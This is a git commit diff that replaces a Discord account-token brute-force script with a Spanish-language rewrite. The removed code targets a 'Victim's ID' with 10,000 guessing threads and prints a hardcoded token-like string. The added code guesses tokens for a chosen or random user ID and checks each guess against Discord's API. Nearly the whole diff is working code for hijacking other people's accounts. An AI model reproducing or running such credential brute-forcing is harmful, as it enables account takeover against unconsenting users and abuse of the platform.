9d9959472650246441ac13baf44d180a53445b1f
Gladion <79752822+Gladion-Dev@users.noreply.github.com>
2021-04-10 13:18:37 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,73 +1,193 @@
-# Credit : Dev by Naoy
-# No Skid
-# https://github.com/NAOYY
-# https://discord.gg/QB628am
-
-import discord
-import string
-import requests as req
-import datetime
-import random
-import time
-import base64
-from threading import Thread as thr
+import sched, time 
 import os
-from colorama import Fore
-import discord, os, json
-from discord.ext import commands
-from discord.ext.commands import Bot
-from plyer import notification
+from urllib.request import urlopen, Request
+import base64
+import random
+import string
+import requests
+from colorama import *
+import sys
+from tkinter import messagebox
+import re
+import json
 
-os.system(f'title Discord Token Brute force By Naoy ^| Version : 1.2')
+def banner():
+    print("")
+    print(f"{Fore.CYAN}")
+    print(f"""                      ███████╗██████╗ ▄▄███▄▄·
+                      ╚══███╔╝██╔══██╗██╔════╝
+                        ███╔╝ ██║  ██║███████╗
+                       ███╔╝  ██║  ██║╚════██║
+                      ███████╗██████╔╝███████║
+                      ╚══════╝╚═════╝ ╚═▀▀▀══╝""")
+    print("                                                                  ")
+    print("   ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗██████╗ ███████╗   ")
+    print("   ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║██╔══██╗██╔════╝   ")
+    print("      ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║██████╔╝█████╗     ")
+    print("      ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║██╔══██╗██╔══╝     ")
+    print("      ██║   ╚██████╔╝██║  ██╗███████╗██║ ║██████╔╝██║        ")
+    print("      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝        ")
+    print("")
 
-TOKEN = input(f"[>] Your token : ")
-os.system('cls')
 
-def notifyMe(title, message):
-	notification.notify(
-		title = title,
-		message = message,
-		app_icon="./nitro.ico",
-		)
 
-class MyClient(discord.Client):
-  async def on_ready(self):
-    userid = input(f"[{Fore.RED}>{Fore.RESET}] Victim's ID : ")
-    user = await client.fetch_user(int(userid))
-    stamp = user.created_at
-    timestamp = str(time.mktime(stamp.timetuple()))
-    print(timestamp)
-    encodedBytes = base64.b64encode(userid.encode("utf-8"))
-    encodedid = str(encodedBytes, "utf-8")
-    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
-    encodedstamp = str(encodedBytes, "utf-8")
-    print(f"{Fore.WHITE}Attempting to crack {Fore.YELLOW}{user}{Fore.WHITE}'s token")
-    time.sleep(3)
-    for i in range(10000):
-      thr(target = gen, args = (encodedid, encodedstamp)).start()
+def idbf():
+    print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    ID a realizar el Bruteforce:", end=" ")
+    id = input()
+    if (id.isdigit()):
+        if (len(id) == 18):
+            idutf8 = id.encode("UTF-8")
+            idencode = base64.b64encode(idutf8)
+            idencode1 = idencode.decode("UTF-8")
+            print(f'{Fore.BLUE}[$]{Style.RESET_ALL}    ID válida, presione "enter" para iniciar el bruteforce')
+            que = input()
+            if (que == ""):
+                request_url = "https://discordapp.com/api/v6/users/@me"
 
-def gen(encodedid, encodedstamp):
-  while True:
-    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
-    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
-    token = f"{encodedid}.{second}.{end}"
-    headers = {'Content-Type': 'application/json', 'authorization': token}
-    url = "https://discordapp.com/api/v6/users/@me/library"
-    r = req.get(url, headers=headers)
-    if r.status_code == 200:
-        print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.GREEN}Valid')
-        notifyMe("Token Finder", f"Le token de {user} Just Found The Token")
-        f = open("token.txt", "a")
-        f.write(token)
-        f.close() 
-        exit(0)
+                def check():
+                    token = ""
+                    while True:
+                        try:
+
+                            caracteres = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])     
+                            token = idencode1 + ('').join(random.choices(caracteres, k=35))
+
+                            headers = {'Authorization': token, 'Content-Type': 'application/json'}  
+                            req = requests.get(request_url, headers=headers)
+
+                            if req.status_code == 401:
+                                print(f"{Fore.RED}[$]{Style.RESET_ALL}    {Fore.RED}Inválido:{Style.RESET_ALL} {token}")
+
+                            elif req.status_code == 200:
+                                print(f"{Fore.GREEN}[$]{Style.RESET_ALL}    {Fore.GREEN}Válido:{Style.RESET_ALL} {token}")
+                                messagebox.showinfo(message=f"¡Token encontrado!", title="[$] Token Bruteforce Script by O$int #NixSquad")
+                                break
+
+                        except KeyboardInterrupt:
+                            print("")
+                            print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Bruteforce terminado")
+                            break
+                check()
+        else:
+            print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    ID inválida, inténtelo de nuevo")
+            q = input()
+            if (q == ""):
+                idbf()
+            else:
+                idbf()
     else:
-        print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.RED}Invalid')
+        print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    ID inválida inténtelo de nuevo")
+        q = input()
+        if (q == ""):
+            idbf()
+        else:
+            idbf()
+
+def randombf():
+            request_url = "https://discordapp.com/api/v8/users/@me"
+
+            def check1():
+                    token1 = ""
+                    while True:
+                        try:
+                            ids = list(['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'])
+                            ide = ('').join(random.choices(ids, k=18))
+                            ideutf8 = ide.encode("UTF-8")
+                            ideencode = base64.b64encode(ideutf8)
+                            ideencode1 = ideencode.decode("UTF-8")
+
+                            caracteres = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])     
+                            token1 = ideencode1 + ('').join(random.choices(caracteres, k=35))
+
+                            headers = {'Authorization': token1, 'Content-Type': 'application/json'}  
+                            req = requests.get(request_url, headers=headers)
+
+                            if req.status_code == 401:
+                                print(f"{Fore.RED}[$]{Style.RESET_ALL}    {Fore.RED}Inválido:{Style.RESET_ALL} {token1}")
+
+                            elif req.status_code == 200:
+                                print(f"{Fore.GREEN}[$]{Style.RESET_ALL}    {Fore.GREEN}Válido:{Style.RESET_ALL} {token1}")
+                                messagebox.showinfo(message=f"¡Token encontrado!", title="[$] Token Bruteforce Script by O$int #NixSquad")
+                        except KeyboardInterrupt:
+                            print("")
+                            print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Bruteforce terminado")
+                            break
+                        
+                        
+            check1()
+
+def menu(): 
+    os.system("@title   [$]  Token Bruteforce Script by O$int #NixSquad  && cls")
+    banner()
+    print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev: O{Fore.BLUE}${Fore.WHITE}int <3")
+    print("")
+    print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Escoja una opción a realizar: ") 
+    print("") 
+    print(f"{Fore.BLUE}[1]{Style.RESET_ALL}    Token Bruteforce por ID") 
+    print(f"{Fore.BLUE}[2]{Style.RESET_ALL}    Token Bruteforce random") 
+    print(f"{Fore.BLUE}[3]{Style.RESET_ALL}    Leave")  
+    print("")
+    print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Opción a escojer: ", end="")
+    opcion = input()
+    if (opcion == "1"):
+        idbf()
+    elif (opcion == "2"):
+        randombf()
+
+    elif (opcion == "3"):
+        os.system("@title   [$]  Leave  && cls")
+        banner()
+        print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Gracias por probar el script de bruteforce de NixSquad by O$int <3")
+        time.sleep(3)
+        exit()        
+    else:
+        os.system("@title   [$]  Acceso denegado  && cls")
+        banner()
+        print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Escoja una opción válida")
+        q = input()
+        if (q == ""):
+            menu()
+        else:
+            menu()
+
+#<===============Main==================>#
+os.system("@title   [$]  Conectando a herramienta...  && cls")
+banner()
+print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev:{Style.RESET_ALL} O{Fore.BLUE}${Fore.WHITE}int <3")
+print("")
+print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Conectando a la herramienta...")
+time.sleep(2)
+os.system("@title   [$]  Token Bruteforce Script by O$int #NixSquad  && cls")
+banner()
+print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev:{Style.RESET_ALL} O{Fore.BLUE}${Fore.WHITE}int <3")
+print("")
+print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Escriba la contraseña para continuar: ", end=f"{Fore.WHITE}")
+contraseña = input()
+if (contraseña == "123"):
+    os.system("@title   [$]  Acceso concedido  && cls")
+    banner()
+    print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Acceso concedido.")
+    time.sleep(3)
+    menu()  
+else:
+    os.system("@title   [$]  Acceso denegado  && cls")
+    banner()
+    print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Acceso denegado")
+    q = input()
+    if (q == ""):
+        os.system('cls')
+        sys.exit()
+    else:
+        os.system('cls')
+        sys.exit()
 
 
-token = os.environ.get(TOKEN)
-client = MyClient()
-client.run(TOKEN, bot=False,)
 
-print('ODE0NjE3ODU1ODY4Nzk2OTQ4.YDgeGA.mSvHXFGAXxvNzFNqdZZXm-CI0Yg')
-time.sleep(10)
+
+    
+
+
+
+
+
+
